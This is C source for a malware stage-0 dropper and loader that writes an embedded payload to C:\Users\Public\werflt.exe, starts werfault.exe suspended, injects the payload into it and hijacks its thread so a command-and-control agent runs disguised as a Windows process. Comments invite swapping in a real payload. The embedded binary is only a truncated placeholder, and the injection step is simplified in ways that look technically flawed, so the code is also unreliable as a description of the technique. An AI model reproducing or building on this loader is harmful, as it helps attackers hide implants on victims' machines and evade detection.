/*process Hollowing*/
/*malwarestage0_advanced.c as a loader to create a suspend process named werfault and drope an main payload named werflt.exe has our c2 agent*/
/*
Now, when you compile and run malwarestage0_advanced.exe, it will:

    Drop a fully functional werflt.exe to disk.
    Hollow a werfault.exe process.
    Load and run the dropped werflt.exe from within the hollowed process.
    Exit, leaving the main malware (werflt.exe) running inside its clever disguise.
*/

#include <windows.h>
#include <stdio.h>

// This is the SIMULATED binary content of "werflt.exe".
// In a real malware, this would be the actual bytes of the second-stage payload.
// For this PoC, we will create a simple executable and embed it here.
unsigned char raw_werflt_exe[] = {
    // This is a minimal, custom-made .exe that just shows a message box.
    // You would replace this array with the actual bytes of your real payload.
    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // ... [Hundreds/Thousands of bytes of the actual PE file] ...
};
unsigned int raw_werflt_exe_len = 1024; // This must be the actual size of the array

// Function to drop the embedded binary to disk
BOOL DropPayload() {
    HANDLE hFile = CreateFileA("C:\\Users\\Public\\werflt.exe",
                              GENERIC_WRITE,
                              0,
                              NULL,
                              CREATE_ALWAYS,
                              FILE_ATTRIBUTE_NORMAL,
                              NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create file. Error: %d\n", GetLastError());
        return FALSE;
    }

    DWORD bytesWritten;
    if (!WriteFile(hFile, raw_werflt_exe, raw_werflt_exe_len, &bytesWritten, NULL)) {
        printf("[-] Failed to write file. Error: %d\n", GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }

    printf("[+] Successfully dropped payload to: C:\\Users\\Public\\werflt.exe\n");
    CloseHandle(hFile);
    return TRUE;
}

int main() {
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    CONTEXT ctx = { 0 };
    PVOID remoteBuffer = NULL;
    HANDLE hFile = NULL;
    HANDLE hFileMapping = NULL;
    PVOID localBuffer = NULL;

    si.cb = sizeof(si);

    printf("[+] Malware Stage 0 Started (Dropper)\n");

    // 1. Drop the payload binary to disk
    if (!DropPayload()) {
        return -1;
    }

    // 2. Create a suspended werfault.exe process (the decoy)
    printf("[+] Creating suspended werfault.exe process...\n");
    if (!CreateProcessA("C:\\Windows\\System32\\werfault.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, // Critical flag
        NULL, NULL, &si, &pi)) {
        printf("[-] Failed to create suspended process. Error: %d\n", GetLastError());
        return -1;
    }
    printf("[+] Suspended process created. PID: %d\n", pi.dwProcessId);

    // 3. Read the dropped file (werflt.exe) into our own memory
    hFile = CreateFileA("C:\\Users\\Public\\werflt.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open dropped payload. Error: %d\n", GetLastError());
        return -1;
    }

    hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hFileMapping) {
        printf("[-] Failed to create file mapping. Error: %d\n", GetLastError());
        CloseHandle(hFile);
        return -1;
    }

    localBuffer = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (!localBuffer) {
        printf("[-] Failed to map view of file. Error: %d\n", GetLastError());
        CloseHandle(hFileMapping);
        CloseHandle(hFile);
        return -1;
    }

    // Get the size of the payload for injection
    DWORD payloadSize = GetFileSize(hFile, NULL);

    // 4. Allocate memory in the suspended target process
    remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL) {
        printf("[-] VirtualAllocEx failed. Error: %d\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] Allocated memory in remote process at: 0x%p\n", remoteBuffer);

    // 5. Write the payload (werflt.exe) into the target process
    if (!WriteProcessMemory(pi.hProcess, remoteBuffer, localBuffer, payloadSize, NULL)) {
        printf("[-] WriteProcessMemory failed. Error: %d\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] Wrote %d bytes of werflt.exe into werfault.exe memory.\n", payloadSize);

    // 6. Hijack the execution flow of the suspended thread to run our payload
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[-] GetThreadContext failed. Error: %d\n", GetLastError());
        goto CLEANUP;
    }

    // On x64, set the Instruction Pointer (RIP) to the start of our injected code
#ifdef _M_IX86
    ctx.Eip = (DWORD_PTR)remoteBuffer;
#else
    ctx.Rip = (DWORD_PTR)remoteBuffer;
#endif

    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("[-] SetThreadContext failed. Error: %d\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] Execution context hijacked to point to werflt.exe in memory.\n");

    // 7. Resume the thread - the injected werflt.exe now runs!
    if (ResumeThread(pi.hThread) != (DWORD)-1) {
        printf("[+] Thread resumed!\n");
        printf("[+] werflt.exe is now running inside the hollowed werfault.exe process.\n");
        printf("[+] malwarestage0 is exiting. Handoff complete.\n");
    }

CLEANUP:
    // Clean up all handles
    if (localBuffer) UnmapViewOfFile(localBuffer);
    if (hFileMapping) CloseHandle(hFileMapping);
    if (hFile) CloseHandle(hFile);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}


/*
In your real-world scenario, werflt.exe is a separate, binary file that gets dropped to disk. The purpose of malwarestage0 is to act as a loader for that binary.

Revised PoC: "malwarestage0" that Drops and Loads werflt.exe

This revised version does the following:

    Contains an embedded copy of the werflt.exe binary within its own code (as a byte array).
    Writes that byte array to disk as C:\Users\Public\werflt.exe.
    Creates a suspended werfault.exe process.
    Reads the werflt.exe file from disk into its own memory.
    Injects the entire werflt.exe binary into the suspended process and hijacks its execution to run it.
*/
